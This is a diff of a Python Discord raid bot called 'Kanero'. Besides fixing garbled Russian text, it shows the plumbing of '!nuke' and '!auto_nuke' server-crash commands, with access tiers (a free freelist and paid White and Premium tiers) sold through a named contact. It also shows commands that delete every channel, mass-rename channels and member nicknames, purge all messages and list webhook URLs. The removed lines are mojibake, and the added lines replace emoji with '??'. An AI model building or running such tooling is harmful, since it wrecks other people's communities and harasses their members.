-                embed.set_footer(text="в пёЏ Kanero  |  Р§РёС‚Р°Р№ РїСЂР°РІРёР»Р°")
+                embed.set_footer(text="?? Kanero  |  Читай правила")
                 await ctx.send(embed=embed)
             except Exception:
                 pass
             return False
         
-        # Р’СЃРµ РѕСЃС‚Р°Р»СЊРЅС‹Рµ РєРѕРјР°РЅРґС‹ вЂ” С‚РѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР° Рё owner whitelist
+        # Все остальные команды — только для овнера и owner whitelist
         if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
             try:
                 embed = discord.Embed(
-                    title="вќЊ РљРѕРјР°РЅРґС‹ Р·РґРµСЃСЊ РЅРµРґРѕСЃС‚СѓРїРЅС‹",
+                    title="? Команды здесь недоступны",
                     description=(
-                        f"{ctx.author.mention}, РєРѕРјР°РЅРґС‹ Р±РѕС‚Р° РёСЃРїРѕР»СЊР·СѓСЋС‚СЃСЏ **РІ Р»РёС‡РЅС‹С… СЃРѕРѕР±С‰РµРЅРёСЏС…** СЃ Р±РѕС‚РѕРј.\n\n"
-                        "РќР°РїРёС€Рё Р±РѕС‚Сѓ РІ Р›РЎ: `!help`\n"
-                        "РР»Рё РґРѕР±Р°РІСЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ."
+                        f"{ctx.author.mention}, команды бота используются **в личных сообщениях** с ботом.\n\n"
+                        "Напиши боту в ЛС: `!help`\n"
+                        "Или добавь бота на свой сервер."
                     ),
                     color=0x2b2d31
                 )
-                embed.set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd")
+                embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd")
                 await ctx.send(embed=embed, delete_after=8)
                 try:
                     await ctx.message.delete()
@@ -617,16 +617,16 @@ async def global_guild_block(ctx):
 @bot.command()
 async def nuke(ctx, *, text: str = None):
     guild = ctx.guild
-    # РќСЋРє Р·Р°РїСЂРµС‰С‘РЅ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ РґР»СЏ РІСЃРµС… РєСЂРѕРјРµ РѕРІРЅРµСЂР°
+    # Нюк запрещён на домашнем сервере для всех кроме овнера
     if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
         return
     if is_guild_blocked(guild.id):
-        embed = discord.Embed(description="рџ”’ Р­С‚РѕС‚ СЃРµСЂРІРµСЂ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.", color=0x0a0a0a)
-        embed.set_footer(text="в пёЏ Kanero")
+        embed = discord.Embed(description="?? Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
-        embed = discord.Embed(description="вљЎ РљСЂР°С€ СѓР¶Рµ Р·Р°РїСѓС‰РµРЅ РЅР° СЌС‚РѕРј СЃРµСЂРІРµСЂРµ.", color=0x0a0a0a)
+        embed = discord.Embed(description="? Краш уже запущен на этом сервере.", color=0x0a0a0a)
         await ctx.send(embed=embed)
         return
 
@@ -636,33 +636,33 @@ async def nuke(ctx, *, text: str = None):
     is_prem = is_premium(uid)
     is_fl = is_freelisted(uid)
 
-    # РќРµС‚ РЅРёРєР°РєРѕРіРѕ РґРѕСЃС‚СѓРїР° вЂ” РЅСѓР¶РЅР° СЂРµРіРёСЃС‚СЂР°С†РёСЏ (freelist)
+    # Нет никакого доступа — нужна регистрация (freelist)
     if not is_owner and not is_wl and not is_prem and not is_fl:
         embed = discord.Embed(
-            title="в пёЏ Р”РћРЎРўРЈРџ Р—РђРџР Р•Р©РЃРќ",
+            title="?? ДОСТУП ЗАПРЕЩЁН",
             description=(
-                "Р”Р»СЏ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЏ `!nuke` РЅСѓР¶РЅР° СЂРµРіРёСЃС‚СЂР°С†РёСЏ.\n\n"
-                "**РљР°Рє РїРѕР»СѓС‡РёС‚СЊ РґРѕСЃС‚СѓРї (Р±РµСЃРїР»Р°С‚РЅРѕ):**\n"
-                "Р—Р°Р№РґРё РЅР° РЅР°С€ СЃРµСЂРІРµСЂ Рё РЅР°РїРёС€Рё РІ РєР°РЅР°Р» `#addbot`\n"
-                "https://discord.gg/aud6wwYVRd\n\n"
-                "**Р Р°СЃС€РёСЂРµРЅРЅС‹Р№ РґРѕСЃС‚СѓРї:** **davaidkatt**"
+                "Для использования `!nuke` нужна регистрация.\n\n"
+                "**Как получить доступ (бесплатно):**\n"
+                "Зайди на наш сервер и напиши в канал `#addbot`\n"
+                "https://discord.gg/nNTB37QNCG\n\n"
+                "**Расширенный доступ:** **davaidkatt**"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
 
-    # РљР°СЃС‚РѕРјРЅС‹Р№ С‚РµРєСЃС‚ вЂ” С‚РѕР»СЊРєРѕ РґР»СЏ whitelist+
+    # Кастомный текст — только для whitelist+
     if text and not is_wl and not is_prem and not is_owner:
         embed = discord.Embed(
-            description="вќЊ РљР°СЃС‚РѕРјРЅС‹Р№ С‚РµРєСЃС‚ РґРѕСЃС‚СѓРїРµРЅ С‚РѕР»СЊРєРѕ РґР»СЏ **White** РїРѕРґРїРёСЃС‡РёРєРѕРІ.\nР—Р° РїРѕРєСѓРїРєРѕР№ РїРёС€Рё: **davaidkatt**",
+            description="? Кастомный текст доступен только для **White** подписчиков.\nЗа покупкой пиши: **davaidkatt**",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
-    # РљР°СЃС‚РѕРјРЅС‹Р№ С‚РµРєСЃС‚ вЂ” С‚РѕР»СЊРєРѕ РґР»СЏ premium/owner (whitelist СЃР±СЂР°СЃС‹РІР°РµС‚ РЅР° РґРµС„РѕР»С‚)
+    # Кастомный текст — только для premium/owner (whitelist сбрасывает на дефолт)
     if text and is_wl and not is_prem and not is_owner:
         text = None
 
@@ -680,49 +680,49 @@ async def stop(ctx):
     guild = ctx.guild
     uid = ctx.author.id
 
-    # РћРІРЅРµСЂ РѕСЃС‚Р°РЅР°РІР»РёРІР°РµС‚ РІСЃРµРіРґР° вЂ” Р±РµР· РєР°РєРёС…-Р»РёР±Рѕ РїСЂРѕРІРµСЂРѕРє
+    # Овнер останавливает всегда — без каких-либо проверок
     if uid == config.OWNER_ID:
         nuke_running[guild.id] = False
         nuke_starter.pop(guild.id, None)
-        await ctx.send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ.")
+        await ctx.send("? Остановлено.")
         return
 
-    # РћСЃС‚Р°Р»СЊРЅС‹Рµ вЂ” С‡РµСЂРµР· wl_check
+    # Остальные — через wl_check
     if not is_whitelisted(uid):
         return
 
     starter_id = nuke_starter.get(guild.id)
 
-    # РќРёРєС‚Рѕ РЅРµ Р·Р°РїСѓСЃРєР°Р» вЂ” РїСЂРѕСЃС‚Рѕ РѕСЃС‚Р°РЅР°РІР»РёРІР°РµРј
+    # Никто не запускал — просто останавливаем
     if starter_id is None:
         nuke_running[guild.id] = False
-        await ctx.send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ.")
+        await ctx.send("? Остановлено.")
         return
 
-    # Р—Р°РїСѓСЃС‚РёР» РѕРІРЅРµСЂ вЂ” С‚РѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ
+    # Запустил овнер — только овнер может остановить
     if starter_id == config.OWNER_ID:
         embed = discord.Embed(
-            description="вќЊ РќСЋРє Р·Р°РїСѓС‰РµРЅ **РѕРІРЅРµСЂРѕРј** вЂ” С‚РѕР»СЊРєРѕ РѕРЅ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ.",
+            description="? Нюк запущен **овнером** — только он может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
 
-    # Р—Р°РїСѓСЃС‚РёР» РїСЂРµРјРёСѓРј вЂ” С‚РѕР»СЊРєРѕ РїСЂРµРјРёСѓРј РёР»Рё РѕРІРЅРµСЂ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ
+    # Запустил премиум — только премиум или овнер может остановить
     if is_premium(starter_id) and not is_premium(uid):
         embed = discord.Embed(
-            description="вќЊ РќСЋРє Р·Р°РїСѓС‰РµРЅ **Premium** РїРѕР»СЊР·РѕРІР°С‚РµР»РµРј вЂ” РѕР±С‹С‡РЅР°СЏ РїРѕРґРїРёСЃРєР° РЅРµ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ.",
+            description="? Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
 
-    # РўРѕР»СЊРєРѕ С‚РѕС‚ РєС‚Рѕ Р·Р°РїСѓСЃС‚РёР» РёР»Рё РѕРІРЅРµСЂ
+    # Только тот кто запустил или овнер
     if uid != starter_id and uid != config.OWNER_ID:
         embed = discord.Embed(
-            description="вќЊ РўРѕР»СЊРєРѕ С‚РѕС‚ РєС‚Рѕ Р·Р°РїСѓСЃС‚РёР» РЅСЋРє РјРѕР¶РµС‚ РµРіРѕ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ.",
+            description="? Только тот кто запустил нюк может его остановить.",
             color=0x0a0a0a
         )
         embed.set_footer(text="Kanero")
@@ -731,7 +731,7 @@ async def stop(ctx):
 
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
-    await ctx.send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ.")
+    await ctx.send("? Остановлено.")
 
 
 @bot.command()
@@ -739,11 +739,11 @@ async def cleanup(ctx):
     uid = ctx.author.id
     if not is_freelisted(uid):
         embed = discord.Embed(
-            title="в пёЏ Р”РћРЎРўРЈРџ Р—РђРџР Р•Р©РЃРќ",
-            description="Р”Р»СЏ `!cleanup` РЅСѓР¶РЅР° СЂРµРіРёСЃС‚СЂР°С†РёСЏ.\nРќР°РїРёС€Рё РІ #addbot: https://discord.gg/aud6wwYVRd",
+            title="?? ДОСТУП ЗАПРЕЩЁН",
+            description="Для `!cleanup` нужна регистрация.\nНапиши в #addbot: https://discord.gg/nNTB37QNCG",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
     await delete_all_channels(ctx.guild)
@@ -765,7 +765,7 @@ async def cleanup(ctx):
             send_messages=True
         )
     channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
-    # РћС‚РїСЂР°РІР»СЏРµРј С‚РµРєСЃС‚ СЃРїР°РјР° С‚РѕР»СЊРєРѕ РµСЃР»Рё nuke Р±С‹Р» РјРµРЅРµРµ 30 СЃРµРєСѓРЅРґ РЅР°Р·Р°Рґ
+    # Отправляем текст спама только если nuke был менее 30 секунд назад
     nuke_time = last_nuke_time.get(ctx.guild.id)
     if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
         text = last_spam_text.get(ctx.guild.id)
@@ -778,13 +778,13 @@ async def cleanup(ctx):
 @commands.cooldown(1, 30, commands.BucketType.guild)
 async def rename(ctx, *, name: str):
     await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
-    await ctx.send("Р“РѕС‚РѕРІРѕ.")
+    await ctx.send("Готово.")
 
 
 @rename.error
 async def rename_error(ctx, error):
     if isinstance(error, commands.CommandOnCooldown):
-        await ctx.send(f"вЏі РљРѕРјР°РЅРґР° РЅР° РєСѓР»РґР°СѓРЅРµ. РџРѕРґРѕР¶РґРё **{error.retry_after:.0f}** СЃРµРє.")
+        await ctx.send(f"? Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")
 
 
 @bot.command()
@@ -792,7 +792,7 @@ async def rename_error(ctx, error):
 async def webhooks(ctx):
     whs = await ctx.guild.webhooks()
     if not whs:
-        await ctx.send("Р’РµР±С…СѓРєРѕРІ РЅРµС‚.")
+        await ctx.send("Вебхуков нет.")
         return
     msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
     await ctx.send(f"```{msg[:1900]}```")
@@ -801,15 +801,15 @@ async def webhooks(ctx):
 @bot.command(name="clear")
 @wl_check()
 async def clear(ctx, amount: int = 10):
-    """РЈРґР°Р»РёС‚СЊ N СЃРѕРѕР±С‰РµРЅРёР№ РІ РєР°РЅР°Р»Рµ. РњР°РєСЃРёРјСѓРј 100."""
+    """Удалить N сообщений в канале. Максимум 100."""
     if amount > 100:
-        await ctx.send("РњР°РєСЃРёРјСѓРј 100 СЃРѕРѕР±С‰РµРЅРёР№.")
+        await ctx.send("Максимум 100 сообщений.")
         return
     if amount < 1:
-        await ctx.send("РњРёРЅРёРјСѓРј 1 СЃРѕРѕР±С‰РµРЅРёРµ.")
+        await ctx.send("Минимум 1 сообщение.")
         return
-    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 С‡С‚РѕР±С‹ СѓРґР°Р»РёС‚СЊ Рё СЃР°РјСѓ РєРѕРјР°РЅРґСѓ
-    msg = await ctx.send(f"рџ—‘пёЏ РЈРґР°Р»РµРЅРѕ **{len(deleted) - 1}** СЃРѕРѕР±С‰РµРЅРёР№.")
+    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
+    msg = await ctx.send(f"??? Удалено **{len(deleted) - 1}** сообщений.")
     await asyncio.sleep(3)
     try:
         await msg.delete()
@@ -820,22 +820,22 @@ async def clear(ctx, amount: int = 10):
 @bot.command(name="clear_all")
 @wl_check()
 async def clear_all(ctx):
-    """РЈРґР°Р»РёС‚СЊ Р’РЎР• СЃРѕРѕР±С‰РµРЅРёСЏ РІ РєР°РЅР°Р»Рµ."""
-    msg = await ctx.send("рџ—‘пёЏ РЈРґР°Р»СЏСЋ РІСЃРµ СЃРѕРѕР±С‰РµРЅРёСЏ...")
+    """Удалить ВСЕ сообщения в канале."""
+    msg = await ctx.send("??? Удаляю все сообщения...")
     total_deleted = 0
     
-    # Discord РїРѕР·РІРѕР»СЏРµС‚ СѓРґР°Р»СЏС‚СЊ РјР°РєСЃРёРјСѓРј 100 СЃРѕРѕР±С‰РµРЅРёР№ Р·Р° СЂР°Р·
-    # РџРѕРІС‚РѕСЂСЏРµРј РїРѕРєР° РµСЃС‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ
+    # Discord позволяет удалять максимум 100 сообщений за раз
+    # Повторяем пока есть сообщения
     while True:
         deleted = await ctx.channel.purge(limit=100)
         if not deleted:
             break
         total_deleted += len(deleted)
-        # РќРµР±РѕР»СЊС€Р°СЏ Р·Р°РґРµСЂР¶РєР° С‡С‚РѕР±С‹ РЅРµ РїРѕРїР°СЃС‚СЊ РІ rate limit
+        # Небольшая задержка чтобы не попасть в rate limit
         await asyncio.sleep(1)
     
-    # РћС‚РїСЂР°РІР»СЏРµРј С„РёРЅР°Р»СЊРЅРѕРµ СЃРѕРѕР±С‰РµРЅРёРµ
-    final_msg = await ctx.send(f"рџ—‘пёЏ РЈРґР°Р»РµРЅРѕ **{total_deleted}** СЃРѕРѕР±С‰РµРЅРёР№.")
+    # Отправляем финальное сообщение
+    final_msg = await ctx.send(f"??? Удалено **{total_deleted}** сообщений.")
     await asyncio.sleep(5)
     try:
         await final_msg.delete()
@@ -848,75 +848,75 @@ async def clear_all(ctx):
 async def nicks_all(ctx, *, nick: str):
     targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
     await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
-    await ctx.send("Р“РѕС‚РѕРІРѕ.")
+    await ctx.send("Готово.")
 
 
 @bot.command()
 async def auto_nuke(ctx, state: str):
     uid = ctx.author.id
-    # Р—Р°РїСЂРµС‰РµРЅРѕ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ РґР»СЏ РЅРµ-РѕРІРЅРµСЂРѕРІ
+    # Запрещено на домашнем сервере для не-овнеров
     if ctx.guild and ctx.guild.id == HOME_GUILD_ID and uid != config.OWNER_ID:
         return
-    # РўСЂРµР±СѓРµС‚ freelist РёР»Рё РІС‹С€Рµ
+    # Требует freelist или выше
     if not is_freelisted(uid) and not is_whitelisted(uid) and not is_premium(uid) and uid != config.OWNER_ID:
         embed = discord.Embed(
-            title="в пёЏ Р”РћРЎРўРЈРџ Р—РђРџР Р•Р©РЃРќ",
+            title="?? ДОСТУП ЗАПРЕЩЁН",
             description=(
-                "Р”Р»СЏ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЏ `!auto_nuke` РЅСѓР¶РЅР° СЂРµРіРёСЃС‚СЂР°С†РёСЏ.\n\n"
-                "**РљР°Рє РїРѕР»СѓС‡РёС‚СЊ РґРѕСЃС‚СѓРї (Р±РµСЃРїР»Р°С‚РЅРѕ):**\n"
-                "Р—Р°Р№РґРё РЅР° РЅР°С€ СЃРµСЂРІРµСЂ Рё РЅР°РїРёС€Рё РІ РєР°РЅР°Р» `#addbot`\n"
-                "https://discord.gg/aud6wwYVRd"
+                "Для использования `!auto_nuke` нужна регистрация.\n\n"
+                "**Как получить доступ (бесплатно):**\n"
+                "Зайди на наш сервер и напиши в канал `#addbot`\n"
+                "https://discord.gg/nNTB37QNCG"
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
     if state.lower() == "on":
         config.AUTO_NUKE = True
-        await ctx.send("вњ… РђРІС‚Рѕ-РєСЂР°С€ РІРєР»СЋС‡РµРЅ.")
+        await ctx.send("? Авто-краш включен.")
     elif state.lower() == "off":
         config.AUTO_NUKE = False
-        await ctx.send("вќЊ РђРІС‚Рѕ-РєСЂР°С€ РІС‹РєР»СЋС‡РµРЅ.")
+        await ctx.send("? Авто-краш выключен.")
     elif state.lower() == "info":
-        status = "вњ… Р’РєР»СЋС‡С‘РЅ" if config.AUTO_NUKE else "вќЊ Р’С‹РєР»СЋС‡РµРЅ"
-        await ctx.send(f"РђРІС‚Рѕ-РєСЂР°С€: {status}")
+        status = "? Включён" if config.AUTO_NUKE else "? Выключен"
+        await ctx.send(f"Авто-краш: {status}")
     else:
-        await ctx.send("РСЃРїРѕР»СЊР·СѓР№: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")
+        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")
 
 
 @bot.command()
 @wl_check()
 async def inv(ctx):
     app_id = bot.user.id
-    # РџРѕР»РЅС‹Рµ РїСЂР°РІР° (Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂ)
+    # Полные права (администратор)
     url_full = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
-    # РњРёРЅРёРјР°Р»СЊРЅС‹Рµ РїСЂР°РІР° С‚РѕР»СЊРєРѕ РґР»СЏ С‡С‚РµРЅРёСЏ (РґР»СЏ /analyze)
-    # permissions=1024 = Read Messages С‚РѕР»СЊРєРѕ
+    # Минимальные права только для чтения (для /analyze)
+    # permissions=1024 = Read Messages только
     url_readonly = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=1024&scope=bot%20applications.commands"
-    # User app (Р±РµР· РґРѕР±Р°РІР»РµРЅРёСЏ РЅР° СЃРµСЂРІРµСЂ)
+    # User app (без добавления на сервер)
     url_user = f"https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1"
 
-    embed = discord.Embed(title="рџ”— РЎСЃС‹Р»РєРё РґР»СЏ РґРѕР±Р°РІР»РµРЅРёСЏ Р±РѕС‚Р°", color=0x0a0a0a)
-    embed.add_field(name="рџ‘‘ РџРѕР»РЅС‹Рµ РїСЂР°РІР° (Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂ)", value=url_full, inline=False)
-    embed.add_field(name="рџ”Ќ РўРѕР»СЊРєРѕ С‡С‚РµРЅРёРµ (РґР»СЏ /analyze)", value=url_readonly, inline=False)
-    embed.add_field(name="рџ“± User App (Р±РµР· РґРѕР±Р°РІР»РµРЅРёСЏ РЅР° СЃРµСЂРІРµСЂ)", value=url_user, inline=False)
-    embed.set_footer(text="в пёЏ Kanero  |  Р”Р»СЏ /analyze РґРѕСЃС‚Р°С‚РѕС‡РЅРѕ СЃСЃС‹Р»РєРё 'РўРѕР»СЊРєРѕ С‡С‚РµРЅРёРµ'")
+    embed = discord.Embed(title="?? Ссылки для добавления бота", color=0x0a0a0a)
+    embed.add_field(name="?? Полные права (администратор)", value=url_full, inline=False)
+    embed.add_field(name="?? Только чтение (для /analyze)", value=url_readonly, inline=False)
+    embed.add_field(name="?? User App (без добавления на сервер)", value=url_user, inline=False)
+    embed.set_footer(text="?? Kanero  |  Для /analyze достаточно ссылки 'Только чтение'")
     await ctx.author.send(embed=embed)
 
 
 
 async def resolve_user(ctx, user_input: str) -> discord.User | None:
-    """Р РµР·РѕР»РІРёС‚ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РїРѕ ID, @mention РёР»Рё username#tag."""
-    # РЈР±РёСЂР°РµРј <@> РёР· mention
+    """Резолвит пользователя по ID, @mention или username#tag."""
+    # Убираем <@> из mention
     uid_str = user_input.strip("<@!>")
-    # РџСЂРѕР±СѓРµРј РєР°Рє ID
+    # Пробуем как ID
     try:
         uid = int(uid_str)
         return await bot.fetch_user(uid)
     except (ValueError, discord.NotFound):
         pass
-    # РџСЂРѕР±СѓРµРј РЅР°Р№С‚Рё РїРѕ РёРјРµРЅРё РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Пробуем найти по имени на домашнем сервере
     home_guild = bot.get_guild(HOME_GUILD_ID)
     if home_guild:
         member = discord.utils.find(
@@ -931,26 +931,26 @@ async def resolve_user(ctx, user_input: str) -> discord.User | None:
 
 
 async def update_stats_channels(guild: discord.Guild):
-    """РћР±РЅРѕРІР»СЏРµС‚ РЅР°Р·РІР°РЅРёСЏ РєР°РЅР°Р»РѕРІ-СЃС‡С‘С‚С‡РёРєРѕРІ РІ РєР°С‚РµРіРѕСЂРёРё РЎРўРђРўРРЎРўРРљРђ."""
-    cat = discord.utils.find(lambda c: "РЎРўРђРўРРЎРўРРљРђ" in c.name, guild.categories)
+    """Обновляет названия каналов-счётчиков в категории СТАТИСТИКА."""
+    cat = discord.utils.find(lambda c: "СТАТИСТИКА" in c.name, guild.categories)
     if not cat:
         return
     total    = guild.member_count
-    guest_r  = discord.utils.find(lambda r: r.name == "рџ‘¤ Guest",    guild.roles)
-    user_r   = discord.utils.find(lambda r: r.name == "рџ‘Ґ User",     guild.roles)
-    white_r  = discord.utils.find(lambda r: r.name == "вњ… White",    guild.roles)
-    prem_r   = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium",  guild.roles)
+    guest_r  = discord.utils.find(lambda r: r.name == "?? Guest",    guild.roles)
+    user_r   = discord.utils.find(lambda r: r.name == "?? User",     guild.roles)
+    white_r  = discord.utils.find(lambda r: r.name == "? White",    guild.roles)
+    prem_r   = discord.utils.find(lambda r: r.name == "?? Premium",  guild.roles)
     counts = {
-        "рџ”Љ all":       total,
-        "рџ‘¤ guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
-        "рџ‘Ґ users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
-        "вњ… whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
-        "рџ’Ћ premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
+        "?? all":       total,
+        "?? guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
+        "?? users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
+        "? whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
+        "?? premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
     }
     for ch in cat.voice_channels:
         for prefix, count in counts.items():
             if ch.name.startswith(prefix):
-                new_name = f"{prefix} вЂў {count}"
+                new_name = f"{prefix} • {count}"
                 if ch.name != new_name:
                     try:
                         await ch.edit(name=new_name)
@@ -961,13 +961,13 @@ async def update_stats_channels(guild: discord.Guild):
 
 @bot.command(name="wl_add")
 async def wl_add(ctx, *, user_input: str):
-    """Р”РѕР±Р°РІРёС‚СЊ РІ Whitelist. Р‘РµР· РґРЅРµР№ вЂ” РЅР°РІСЃРµРіРґР°. РЎ РґРЅСЏРјРё вЂ” РІСЂРµРјРµРЅРЅРѕ.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !wl_add @user [РґРЅРё] | !wl_add all [РґРЅРё]
+    """Добавить в Whitelist. Без дней — навсегда. С днями — временно.
+    Использование: !wl_add @user [дни] | !wl_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
 
-    # РџР°СЂСЃРёРј вЂ” РїРѕСЃР»РµРґРЅРёР№ Р°СЂРіСѓРјРµРЅС‚ РјРѕР¶РµС‚ Р±С‹С‚СЊ РґР»РёС‚РµР»СЊРЅРѕСЃС‚СЊСЋ
+    # Парсим — последний аргумент может быть длительностью
     parts = user_input.rsplit(maxsplit=1)
     duration_hours = None
     actual_input = user_input
@@ -978,15 +978,15 @@ async def wl_add(ctx, *, user_input: str):
         except Exception:
             actual_input = user_input
 
-    # Р РµР¶РёРј ALL
+    # Режим ALL
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
-            await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+            await ctx.send("? Домашний сервер не найден.")
             return
-        msg = await ctx.send("вЏі Р’С‹РґР°СЋ White РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј...")
+        msg = await ctx.send("? Выдаю White всем участникам...")
         count = 0
-        white_role = discord.utils.find(lambda r: r.name == "вњ… White", home_guild.roles)
+        white_role = discord.utils.find(lambda r: r.name == "? White", home_guild.roles)
         for member in home_guild.members:
             if member.bot:
                 continue
@@ -1005,28 +1005,28 @@ async def wl_add(ctx, *, user_input: str):
         if not duration_hours:
             save_whitelist()
         days = duration_hours // 24 if duration_hours else 0
-        dur_text = f" РЅР° **{days} РґРЅ.**" if duration_hours else " РЅР°РІСЃРµРіРґР°"
-        await msg.edit(content=f"вњ… **White**{dur_text} РІС‹РґР°РЅ **{count}** СѓС‡Р°СЃС‚РЅРёРєР°Рј.")
+        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
+        await msg.edit(content=f"? **White**{dur_text} выдан **{count}** участникам.")
         return
 
     user = await resolve_user(ctx, actual_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{actual_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{actual_input}` не найден.")
         return
     user_id = user.id
 
     if duration_hours:
         add_temp_subscription(user_id, "wl", duration_hours)
         days = duration_hours // 24
-        duration_text = f"{days} РґРЅ." if days > 0 else f"{duration_hours} С‡."
-        result_text = f"вњ… **{user}** РїРѕР»СѓС‡РёР» **White** РЅР° **{duration_text}** (РІСЂРµРјРµРЅРЅРѕ)."
+        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
+        result_text = f"? **{user}** получил **White** на **{duration_text}** (временно)."
     else:
         if user_id not in config.WHITELIST:
             config.WHITELIST.append(user_id)
             save_whitelist()
-        result_text = f"вњ… **{user}** (`{user_id}`) РґРѕР±Р°РІР»РµРЅ РІ whitelist РЅР°РІСЃРµРіРґР°."
+        result_text = f"? **{user}** (`{user_id}`) добавлен в whitelist навсегда."
 
-    # Р’С‹РґР°С‘Рј СЂРѕР»СЊ
+    # Выдаём роль
     try:
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
@@ -1037,7 +1037,7 @@ async def wl_add(ctx, *, user_input: str):
                 except Exception:
                     member = None
             if member:
-                role = discord.utils.find(lambda r: r.name == "вњ… White", home_guild.roles)
+                role = discord.utils.find(lambda r: r.name == "? White", home_guild.roles)
                 if role and role not in member.roles:
                     await member.add_roles(role, reason="wl_add")
             await update_stats_channels(home_guild)
@@ -1048,12 +1048,12 @@ async def wl_add(ctx, *, user_input: str):
 
 @bot.command(name="wl_remove")
 async def wl_remove(ctx, *, user_input: str):
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
     user = await resolve_user(ctx, user_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{user_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{user_input}` не найден.")
         return
     user_id = user.id
     if user_id in config.WHITELIST:
@@ -1065,15 +1065,15 @@ async def wl_remove(ctx, *, user_input: str):
                 if home_guild:
                     member = home_guild.get_member(user_id)
                     if member:
-                        role = discord.utils.find(lambda r: r.name == "вњ… White", home_guild.roles)
